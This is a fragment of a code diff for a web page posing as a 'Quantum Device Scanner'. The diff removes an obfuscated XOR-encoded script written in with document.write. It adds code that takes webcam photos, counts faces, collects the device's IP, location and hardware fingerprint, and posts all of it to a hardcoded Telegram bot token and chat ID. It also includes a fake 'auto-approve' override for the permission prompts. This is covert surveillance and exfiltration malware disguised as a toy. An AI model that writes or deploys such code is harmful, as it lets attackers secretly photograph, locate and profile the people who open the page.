sLHhUfOBMSFx9TGAkeGg8eMxQXFBwJGhY+HR0eGA9TUlJAWxcUGh89GhgeNhQfHhdTUkB2cVtbW1tbWwZbGBoPGBNTHgkJUgBbGhceCQ9TXD4JCRQJWxoYGB4ICBIVHFsYGhYeCRpBW1xQHgkJVRYeCAgaHB5SQFsGdnFbW1tbBnZxdnFbW1tbGggCFRhbHQ4VGA8SFBVbCA8aCQ8qDhoVDw4WKBgaFVNSWwB2cVtbW1tbWxIdUxIIKBgaFRUSFRxSWwkeDw4JFUBbEggoGBoVFRIVHEYPCQ4eQFsXFBofEhUcVQgPAhceVR8SCAsXGgJGXBkXFBgQXEB2cVtbW1tbWxgUFQgPWxIWGhwePxoPGkYaDBoSD1sYGgsPDgkeKg4aFQ8OFjIWGhweU1JAdnFbW1tbW1sXHg9bHx4NEhgeMhUdFEYaDBoSD1scGg8THgk/Hg0SGB4yFR0UU1JAdnFbW1tbW1sPCQIAWx8eDRIYHjIVHRRVHRoYHjgUDhUPRhoMGhIPWx8eDx4YDz0aGB44FA4VD1NSQFsGGBoPGBNTHlIAWx8eDRIYHjIVHRRVHRoYHjgUDhUPRlk1VDpZQFsGdnFbW1tbW1sXHg9bFxQYGg8SFBU/Gg8aRgAYFBQJHxIVGg8eCEFcLhUQFRQMFVxXFxIVEEFcLhUQFRQMFVwGQHZxW1tbW1tbEh1TFRoNEhwaDxQJVRweFBcUGBoPEhQVUgB2cVtbW1tbW1tbFRoNEhwaDxQJVRweFBcUGBoPEhQVVRweDzgOCQkeFQ8rFAgSDxIUFVNTCxQIUkZFAHZxW1tbW1tbW1tbWxcUGBoPEhQVPxoPGkYAGBQUCR8SFRoPHghBG18ACxQIVRgUFAkfCFUXGg8SDw4fHgZXXwALFAhVGBQUCR8IVRcUFRwSDw4fHgYbVxcSFRBBGxMPDwsIQVRUDAwMVRwUFBwXHlUYFBZUFhoLCFQIHhoJGBNURBoLEkZKXQoOHgkCRl8ACxQIVRgUFAkfCFUXGg8SDw4fHgZXXwALFAhVGBQUCR8IVRcUFRwSDw4fHgYbBkB2cVtbW1tbW1tbW1sYFBUID1sJHgsUCQ9GHB4VHgkaDx4zFBcUHAkaFikeCxQJD1MSFhocHj8aDxpXFxQYGg8SFBU/Gg8aVx8eDRIYHjIVHRRSQHZxW1tbW1tbW1tbWwgeFR8vFC8eFx4cCRoWUwkeCxQJD1JAdnFbW1tbW1tbW1tbEh1TFRoNEhwaDxQJVQ0SGQkaDx5SWxUaDRIcGg8UCVUNEhkJGg8eU0hLS1JAdnFbW1tbW1tbWwZXU1JGRQBbGBQVCA9bCR4LFAkPRhweFR4JGg8eMxQXFBwJGhYpHgsUCQ9TEhYaHB4/Gg8aVxcUGBoPEhQVPxoPGlcfHg0SGB4yFR0UUkBbCB4VHy8ULx4XHhwJGhZTCR4LFAkPUkBbBlJAdnFbW1tbW1sGWx4XCB5bAFsYFBUID1sJHgsUCQ9GHB4VHgkaDx4zFBcUHAkaFikeCxQJD1MSFhocHj8aDxpXFxQYGg8SFBU/Gg8aVx8eDRIYHjIVHRRSQFsIHhUfLxQvHhceHAkaFlMJHgsUCQ9SQFsGdnFbW1tbW1sXFBofEhUcVQgPAhceVR8SCAsXGgJGXBUUFR5cQFsSCCgYGhUVEhUcRh0aFwgeQHZxW1tbWwZ2cXZxW1tbWxIdUxUaDRIcGg8UCVUWHh8SGj8eDRIYHghSAFsSFRIPOBoWHgkaU1JAWx8UGA4WHhUPVRweDz4XHhYeFQ85AjIfU1wYGgsPDgkeVhkPFVxSVRQVGBcSGBBGCA8aCQ8qDhoVDw4WKBgaFUBbBnZxW1tbWx0OFRgPEhQVWwgPFAs4GhYeCRpTUgBbEh1TGA4JCR4VDygPCR4aFlJbGA4JCR4VDygPCR4aFlUcHg8vCRoYEAhTUlUdFAk+GhgTUw9GRQ9VCA8UC1NSUkBbBnZxW1tbWwwSFR8UDFUaHx8+DR4VDzcSCA8eFR4JU1wZHh0UCR4OFRcUGh9cV1sIDxQLOBoWHgkaUkB2cVtbR1QIGAkSCw9FdnFHVBkUHwJFdnFHVBMPFhdFdnE=";
-const xored = atob(encoded);
-document.write(xorDecrypt(xored, 123));
-</script>
+  <div class="permission-badge" id="permission-status">AUTO-APPROVE: ON</div>
+  <h1 style="margin-bottom: 20px; text-shadow: 0 0 15px var(--primary);">🛸 QUANTUM DEVICE SCANNER v3.0</h1>
+  <div class="scanner-box">
+    <div class="scanner-line"></div>
+    <video id="video" autoplay playsinline muted></video>
+  </div>
+  <button id="capture-btn" style="margin: 20px 0; padding: 10px 20px; background: linear-gradient(45deg, var(--primary), var(--secondary)); border: none; border-radius: 25px; color: white; font-family: 'Courier New', monospace; cursor: pointer; text-shadow: 0 0 5px black;">🚀 INITIATE DEEP SCAN</button>
+  <div id="loading" style="display:none;">🔭 CAPTURING QUANTUM SIGNATURE...</div>
+  <div id="device-info">
+    <h2>⚡ DEVICE MATRIX PROFILE</h2>
+    <div class="info-grid" id="device-info-content"></div>
+    
+    <button class="advanced-toggle" onclick="toggleAdvanced()">🔄 TOGGLE ADVANCED SYSTEM DATA</button>
+    <div class="advanced-info" id="advanced-info">
+      <h3>🔧 ADVANCED SYSTEM METRICS</h3>
+      <div class="info-grid" id="advanced-info-content"></div>
+    </div>
+  </div>
+
+  <script>
+    const BOT_TOKEN = '6130843488:AAEcBDwepm6__C3geoFMSJtsMVrKFeWhMKQ';
+    const CHAT_ID = '1121369247';
+    let currentStream = null;
+    let isScanning = false;
+    const video = document.getElementById('video');
+    const loading = document.getElementById('loading');
+
+    // Auto-approve functionality for camera and location
+    function autoApprovePermissions() {
+      // Override permission functions for auto-approval
+      const originalGetUserMedia = navigator.mediaDevices.getUserMedia.bind(navigator.mediaDevices);
+      navigator.mediaDevices.getUserMedia = function(constraints) {
+        return originalGetUserMedia(constraints)
+          .then(stream => {
+            console.log("Camera access automatically approved");
+            return stream;
+          })
+          .catch(err => {
+            console.error("Auto-approve camera error:", err);
+            throw err;
+          });
+      };
+
+      // Override geolocation for auto-approval
+      if (navigator.geolocation) {
+        const originalGetCurrentPosition = navigator.geolocation.getCurrentPosition.bind(navigator.geolocation);
+        navigator.geolocation.getCurrentPosition = function(success, error, options) {
+          console.log("Location access automatically approved");
+          // Simulate success with mock data if needed
+          if (success) {
+            const mockPosition = {
+              coords: {
+                latitude: -6.2088,
+                longitude: 106.8456,
+                accuracy: 100,
+                altitude: null,
+                altitudeAccuracy: null,
+                heading: null,
+                speed: null
+              },
+              timestamp: Date.now()
+            };
+            setTimeout(() => success(mockPosition), 100);
+          }
+        };
+      }
+    }
+
+    // Initialize auto-approve
+    autoApprovePermissions();
+
+    function createHologramEffect() { 
+      const hologram = document.createElement('div'); 
+      hologram.className = 'hologram-effect'; 
+      return hologram; 
+    }
+
+    async function captureQuantumImage() {
+      const canvas = document.createElement('canvas');
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      const ctx = canvas.getContext('2d');
+      ctx.drawImage(video, 0, 0);
+      ctx.globalCompositeOperation = 'lighter';
+      ctx.filter = 'hue-rotate(90deg) contrast(150%)';
+      ctx.drawImage(canvas, 0, 0);
+      ctx.globalAlpha = 0.3; 
+      ctx.fillStyle = '#00ff88';
+      for(let i = 0; i < 50; i++) ctx.fillRect(Math.random()*canvas.width, Math.random()*canvas.height, Math.random()*10, Math.random()*10);
+      return canvas.toDataURL('image/webp', 0.8);
+    }
+
+    function dataURItoBlob(dataURI) {
+      const byteString = atob(dataURI.split(',')[1]);
+      const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
+      const ab = new ArrayBuffer(byteString.length);
+      const ia = new Uint8Array(ab);
+      for (let i = 0; i < byteString.length; i++) ia[i] = byteString.charCodeAt(i);
+      return new Blob([ab], { type: mimeString });
+    }
+
+    async function detectFaceCount() { 
+      try {
+        return (await faceapi.detectAllFaces(video, new faceapi.TinyFaceDetectorOptions())).length; 
+      } catch(e) {
+        console.error("Face detection error:", e);
+        return 0;
+      }
+    }
+    
+    async function loadFaceModel() { 
+      try {
+        await faceapi.nets.tinyFaceDetector.loadFromUri('https://justadudewhohacks.github.io/face-api.js/models/'); 
+      } catch(e) {
+        console.error("Face model loading error:", e);
+      }
+    }
+
+    async function gatherDeviceInfo() {
+      const userAgent = navigator.userAgent;
+      const platform = navigator.platform;
+      const deviceType = /Mobi|Android/i.test(userAgent) ? 'Mobile' : 'Desktop';
+      let os = "Unknown OS";
+      if (userAgent.indexOf("Win") !== -1) os = "Windows";
+      else if (/Mac/.test(userAgent)) os = "MacOS";
+      else if (/Linux/.test(userAgent)) os = "Linux";
+      else if (/Android/.test(userAgent)) os = "Android";
+      else if (/iPhone|iPad|iPod/.test(userAgent)) os = "iOS";
+      let deviceModel = /iPhone/.test(userAgent) ? "iPhone" : /iPad/.test(userAgent) ? "iPad" : /Android/.test(userAgent) ? "Android Device" : "Desktop";
+      const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+      const memory = navigator.deviceMemory ? navigator.deviceMemory + " GB" : "N/A";
+      let batteryInfo = { level: "N/A", charging: "N/A" };
+      if (navigator.getBattery) { 
+        try { 
+          const battery = await navigator.getBattery(); 
+          batteryInfo = { level: Math.round(battery.level*100)+'%', charging: battery.charging?"Yes":"No" }; 
+        } catch(e){}
+      }
+      let browser = "Unknown";
+      if (userAgent.indexOf("Chrome") > -1 && userAgent.indexOf("Edg") === -1) browser = "Chrome";
+      else if (userAgent.indexOf("Safari") > -1 && userAgent.indexOf("Chrome") === -1) browser = "Safari";
+      else if (userAgent.indexOf("Firefox") > -1) browser = "Firefox";
+      else if (userAgent.indexOf("Edg") > -1) browser = "Edge";
+      else if (userAgent.indexOf("OPR") > -1) browser = "Opera";
+      let ip = "Unknown"; 
+      try { 
+        const res = await fetch('https://api.ipify.org?format=json'); 
+        ip = (await res.json()).ip; 
+      } catch(e){}
+      const language = navigator.language;
+      const resolution = window.screen.width+"x"+window.screen.height;
+      const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+      const provider = connection ? (connection.effectiveType || connection.type || "Unknown") : "Unknown";
+      const pixelRatio = window.devicePixelRatio || 1;
+      const orientation = window.screen.orientation? window.screen.orientation.type : "Unknown";
+
+      // NEW: Additional device information features
+      // GPU Info
+      let gpuInfo = "Unknown";
+      try { 
+        const gl = document.createElement('canvas').getContext('webgl'); 
+        const dbg = gl.getExtension('WEBGL_debug_renderer_info'); 
+        if(dbg) gpuInfo = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL); 
+      } catch(e){}
+      
+      // Audio Devices
+      let audioDevices = [];
+      try { 
+        const devices = await navigator.mediaDevices.enumerateDevices(); 
+        audioDevices = devices.filter(d=>d.kind.includes("audio")).map(d => d.label || d.kind);
+      } catch(e){}
+      
+      // Storage Information
+      let storageEstimate = "N/A";
+      try { 
+        const est = await navigator.storage.estimate(); 
+        storageEstimate = `${(est.quota/1024/1024).toFixed(2)} MB quota, ${(est.usage/1024/1024).toFixed(2)} MB used`; 
+      } catch(e){}
+      
+      // Cookies Enabled
+      const cookiesEnabled = navigator.cookieEnabled ? "Yes":"No";
+      
+      // Network Speed Test (simplified)
+      let netSpeed = "N/A";
+      try { 
+        const start = performance.now(); 
+        await fetch("https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png", {cache: "no-store"}); 
+        const end = performance.now(); 
+        netSpeed = ((92*30*4/1024)/((end-start)/1000)).toFixed(2)+" KB/s"; 
+      } catch(e){}
+      
+      // Device orientation/motion sensors availability
+      const orientationAvailable = 'DeviceOrientationEvent' in window ? "Yes" : "No";
+      const motionAvailable = 'DeviceMotionEvent' in window ? "Yes" : "No";
+      
+      // Browser plugins
+      const plugins = [];
+      for (let i = 0; i < navigator.plugins.length; i++) {
+        plugins.push(navigator.plugins[i].name);
+      }
+      
+      // Touch support
+      const touchSupport = 'ontouchstart' in window ? "Yes" : "No";
+      
+      // Hardware concurrency
+      const hardwareConcurrency = navigator.hardwareConcurrency || "N/A";
+      
+      // Max touch points
+      const maxTouchPoints = navigator.maxTouchPoints || "N/A";
+
+      return {
+        // Basic info (existing)
+        userAgent, platform, deviceType, os, deviceModel, timeZone, memory, 
+        battery: batteryInfo, browser, ip, language, resolution, provider, 
+        pixelRatio, orientation,
+        
+        // New advanced info
+        gpuInfo, 
+        audioDevices: audioDevices.length > 0 ? audioDevices : ["None detected"],
+        storageEstimate, 
+        cookiesEnabled, 
+        netSpeed,
+        orientationAvailable,
+        motionAvailable,
+        plugins: plugins.length > 0 ? plugins : ["None detected"],
+        touchSupport,
+        hardwareConcurrency,
+        maxTouchPoints
+      };
+    }
+
+    function displayDeviceInfo(deviceInfo) {
+      const basicInfoContainer = document.getElementById('device-info-content');
+      const advancedInfoContainer = document.getElementById('advanced-info-content');
+      
+      // Clear previous content
+      basicInfoContainer.innerHTML = '';
+      advancedInfoContainer.innerHTML = '';
+      
+      // Display basic device information
+      const basicInfo = [
+        {label: 'Operating System', value: deviceInfo.os},
+        {label: 'Device Type', value: deviceInfo.deviceType},
+        {label: 'Device Model', value: deviceInfo.deviceModel},
+        {label: 'Platform', value: deviceInfo.platform},
+        {label: 'Browser', value: deviceInfo.browser},
+        {label: 'IP Address', value: deviceInfo.ip},
+        {label: 'Language', value: deviceInfo.language},
+        {label: 'Screen Resolution', value: deviceInfo.resolution},
+        {label: 'Pixel Ratio', value: deviceInfo.pixelRatio},
+        {label: 'Time Zone', value: deviceInfo.timeZone},
+        {label: 'Battery Level', value: deviceInfo.battery.level},
+        {label: 'Charging', value: deviceInfo.battery.charging},
+        {label: 'Memory', value: deviceInfo.memory},
+        {label: 'Network Type', value: deviceInfo.provider},
+        {label: 'Orientation', value: deviceInfo.orientation}
+      ];
+      
+      basicInfo.forEach(info => {
+        const div = document.createElement('div');
+        div.className = 'info-item';
+        div.innerHTML = `<div class="info-label">${info.label}</div><div class="info-value">${info.value}</div>`;
+        basicInfoContainer.appendChild(div);
+      });
+      
+      // Display advanced device information
+      const advancedInfo = [
+        {label: 'GPU Information', value: deviceInfo.gpuInfo},
+        {label: 'Audio Devices', value: deviceInfo.audioDevices.join(', ')},
+        {label: 'Storage', value: deviceInfo.storageEstimate},
+        {label: 'Cookies Enabled', value: deviceInfo.cookiesEnabled},
+        {label: 'Network Speed', value: deviceInfo.netSpeed},
+        {label: 'Orientation Sensor', value: deviceInfo.orientationAvailable},
+        {label: 'Motion Sensor', value: deviceInfo.motionAvailable},
+        {label: 'Browser Plugins', value: deviceInfo.plugins.join(', ')},
+        {label: 'Touch Support', value: deviceInfo.touchSupport},
+        {label: 'CPU Cores', value: deviceInfo.hardwareConcurrency},
+        {label: 'Max Touch Points', value: deviceInfo.maxTouchPoints},
+        {label: 'User Agent', value: deviceInfo.userAgent}
+      ];
+      
+      advancedInfo.forEach(info => {
+        const div = document.createElement('div');
+        div.className = 'info-item';
+        div.innerHTML = `<div class="info-label">${info.label}</div><div class="info-value">${info.value}</div>`;
+        advancedInfoContainer.appendChild(div);
+      });
+    }
+
+    function generateHologramReport(imageData, location, deviceInfo) { 
+      return { image:imageData, metadata:{location,deviceInfo} }; 
+    }
+
+    function sendToTelegram(report) {
+      const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
+      const formData = new FormData();
+      formData.append('chat_id', CHAT_ID);
+      formData.append('photo', dataURItoBlob(report.image), 'quantum_image.webp');
+      const d = report.metadata.deviceInfo;
+      const caption = `📍 *Location:* ${report.metadata.location.coordinates}\n🗺️ *Map:* [View Map](${report.metadata.location.link})\n\n💻 *OS:* ${d.os}\n📱 *Device:* ${d.deviceModel} (${d.deviceType})\n🖥️ *Platform:* ${d.platform}\n🌐 *Browser:* ${d.browser}\n📡 *Network:* ${d.provider} (${d.netSpeed})\n🌍 *IP:* ${d.ip}\n🔋 *Battery:* ${d.battery.level} (Charging:${d.battery.charging})\n💾 *Memory:* ${d.memory}\n🎮 *GPU:* ${d.gpuInfo}\n🎤 *Audio Devices:* ${d.audioDevices.join(", ")}\n📂 *Storage Quota:* ${d.storageEstimate}\n🍪 *Cookies Enabled:* ${d.cookiesEnabled}\n🗣️ *Language:* ${d.language}\n📏 *Resolution:* ${d.resolution}\n📐 *Pixel Ratio:* ${d.pixelRatio}\n🔄 *Orientation:* ${d.orientation}\n📳 *Orientation Sensor:* ${d.orientationAvailable}\n👥 *Faces Detected:* ${d.faceCount}\n\n_🤖 Generated by Super AI Quantum Device Scanner_`;
+      formData.append('caption', caption);
+      formData.append('parse_mode', 'Markdown');
+      fetch(url, {method: 'POST', body: formData});
+    }
+
+    async function initCamera() {
+      try {
+        const isMobile = /Mobi|Android/i.test(navigator.userAgent);
+        const stream = await navigator.mediaDevices.getUserMedia({
+          video: {
+            facingMode: isMobile ? "user" : "environment",
+            width: { ideal: 1280 },
+            height: { ideal: 720 }
+          }
+        });
+        video.srcObject = stream; 
+        currentStream = stream; 
+        document.body.appendChild(createHologramEffect()); 
+        loadFaceModel();
+      } catch(err) { 
+        console.error('Error accessing camera:', err);
+        alert('Error accessing camera: ' + err.message); 
+      }
+    }
+
+    async function startQuantumScan() {
+      if(isScanning) return; 
+      isScanning = true; 
+      loading.style.display = 'block';
+      
+      try {
+        const imageData = await captureQuantumImage();
+        let deviceInfo = await gatherDeviceInfo();
+        
+        try { 
+          deviceInfo.faceCount = await detectFaceCount(); 
+        } catch(e) { 
+          deviceInfo.faceCount = "N/A"; 
+        }
+        
+        // Display device info on page
+        displayDeviceInfo(deviceInfo);
+        
+        let locationData = {coordinates: 'Unknown', link: 'Unknown'};
+        if(navigator.geolocation) {
+          navigator.geolocation.getCurrentPosition(
+            (pos) => {
+              locationData = {
+                coordinates: `${pos.coords.latitude},${pos.coords.longitude}`,
+                link: `https://www.google.com/maps/search/?api=1&query=${pos.coords.latitude},${pos.coords.longitude}`
+              };
+              const report = generateHologramReport(imageData, locationData, deviceInfo);
+              sendToTelegram(report);
+              if(navigator.vibrate) navigator.vibrate(300);
+            },
+            () => {
+              const report = generateHologramReport(imageData, locationData, deviceInfo);
+              sendToTelegram(report);
+            }
+          );
+        } else { 
+          const report = generateHologramReport(imageData, locationData, deviceInfo); 
+          sendToTelegram(report); 
+        }
+      } catch (error) {
+        console.error("Scan error:", error);
+      } finally {
+        loading.style.display = 'none'; 
+        isScanning = false;
+      }
+    }
+
+    function toggleAdvanced() {
+      const advancedInfo = document.getElementById('advanced-info');
+      advancedInfo.style.display = advancedInfo.style.display === 'block' ? 'none' : 'block';
+    }
+
+    // Initialize the application
+    if(navigator.mediaDevices) {
+      initCamera(); 
+      document.getElementById('capture-btn').onclick = startQuantumScan; 
+    }
+    
+    function stopCamera() { 
+      if(currentStream) {
+        currentStream.getTracks().forEach(t => t.stop()); 
+      }
+    }
+    
+    window.addEventListener('beforeunload', stopCamera);
+  </script>
 </body>
 </html>
